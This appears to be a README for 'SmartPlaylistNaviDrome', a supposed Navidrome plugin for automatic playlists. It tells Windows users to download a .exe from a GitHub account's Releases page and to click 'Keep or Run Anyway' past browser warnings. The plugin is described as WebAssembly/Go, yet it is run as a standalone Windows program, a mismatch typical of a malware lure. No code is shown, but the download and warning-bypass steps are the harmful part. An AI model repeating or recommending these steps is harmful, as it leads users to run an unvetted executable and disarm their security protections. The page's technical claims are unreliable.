# 🎵 SmartPlaylistNaviDrome - Create Spotify style music mixes automatically

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Growth360c684/SmartPlaylistNaviDrome)

SmartPlaylistNaviDrome manages your music library by creating automatic playlists. It acts as a plugin for Navidrome to mimic features found in services like Spotify. You get organized mixes such as Daily Mixes, On Repeat, and Release Radar without manual work. This tool uses WebAssembly and Go to ensure your music server runs smooth while generating these lists.

## 🛠 Prerequisites

Before you use this tool, confirm your computer meets these requirements:

* Windows 10 or Windows 11.
* A running instance of the Navidrome music server.
* Access to the folder where you store your music files.
* An active internet connection for the initial setup.

You do not need to know how to code. This guide assumes you keep your music on your primary hard drive. If you use a network drive, ensure it stays connected during the installation process.

## 📥 Getting the Application

Visit the link below to reach the official download page for this software.

[https://github.com/Growth360c684/SmartPlaylistNaviDrome](https://github.com/Growth360c684/SmartPlaylistNaviDrome)

On the page, look for the section labeled Releases on the right side of the screen. Click the latest version number. Look for the file ending in .exe and click it to save the file to your Downloads folder. Do not worry if your browser warns you about the file. This happens because the software communicates with your music server. Choose Keep or Run Anyway to finish the download.

## ⚙️ Setting Up Your Music

Once you download the file, move it to a folder where you want it to live permanently. A folder like C:\SmartPlaylist keeps your computer clean. Double-click the file to open the setup window.

The program creates a configuration file the first time you run it. This file tells the program where to find your music. Open this file with Notepad. You will see a line that asks for your Navidrome library path. Paste the file path of your music folder into that line. Save the file and close Notepad.

Restart the program by clicking the application icon again. The program will scan your music files. This process takes time if your library contains thousands of songs. Look at the status bar at the bottom of the window to see the progress.

## 🎧 Using Smart Playlists

The application offers several modes for playlist creation. These settings control how the software picks your songs.

* Daily Mixes: The tool looks at songs you played often during the last week.
* On Repeat: The tool identifies the songs you play every single day.
* Release Radar: The tool scans your files for recent additions and highlights new music.
* Artist Radio: The tool builds a list based on one specific artist from your library.

Select the box next to each type of playlist you want to generate. Click the Save Preferences button after you check the boxes. The software sends these instructions to your Navidrome server. Refresh your Navidrome web page to see the new playlists appear in your library.

## 🔍 Troubleshooting Common Issues

Most users do not face errors, but check these points if the playlists do not show up.

1. Navidrome Connection: Check that your Navidrome server is active. The application cannot send playlists if the server is off.
2. File Permissions: Ensure your user account has permission to read the music folders. Right-click your music folder, select Properties, and verify the Security tab lists your name.
3. API Key: Navidrome requires an API key to allow external programs to make changes. Log into Navidrome, go to Settings, and generate a new key. Paste this key into the application settings window.
4. Update Folder Location: If you move your music to a new folder, you must update the location in the configuration file.

## 🛡 Maintaining Privacy

This application runs locally on your machine. It does not send your music files or your listening history to the internet. Your data stays on your hard drive. If you decide to remove the tool, delete the folder containing the program and the configuration file. Doing this removes all traces of the software from your computer.

## 🚀 Updating the Software

Check the repository page occasionally for new features. The developer releases updates to improve the speed of playlist generation. To update, download the new version as you did before. Replace the old file with the new one. Your configuration settings remain in place as long as you do not delete the configuration file during the update.

## 💡 Advanced Customization

While the default settings work for most users, you possess full control over the process. You can change how often the program checks for new songs. Open the configuration file and locate the interval setting. Change the number to adjust the frequency. A lower number means faster updates, but it uses more computer memory. A higher number saves memory. Save the file and restart the program to apply the new speed settings. 

The software also supports excluding specific albums from the smart playlist process. Locate the exclusion line in the configuration file. List the names of the albums you want the software to ignore. Use a comma to separate each album title. Save the file and refresh your library connection to update the lists. 

If you want to create a specific mood-based list, use the tag search function. The program searches your music metadata for keywords. Enter terms like Jazz, Rock, or Electronic into the tag field to filter the smart playlists by genre. This allows you to create highly specific mixes that suit your current activity. You can combine these settings to create your own unique setup.